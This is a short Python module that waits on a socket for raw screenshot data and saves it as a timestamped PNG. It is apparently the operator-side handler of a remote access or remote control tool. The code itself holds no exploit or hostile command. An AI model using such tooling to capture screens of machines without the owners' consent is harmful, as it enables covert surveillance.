import os
import library.modules.recv_all as recv_all
from datetime import datetime
import library.modules.config as config

config.main()


def main(sock):
    print(config.inf + 'Waiting for raw screenshot data to arrive')
    raw_bytes = recv_all.main(sock)
    file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
    if type(raw_bytes) == str:
        print(raw_bytes)
    else:
        with open(file_name, 'wb') as f:
            f.write(raw_bytes)
        print(config.pos + 'Wrote file to : ' + os.path.join(os.getcwd(), file_name))
        print(config.pos + 'Done')
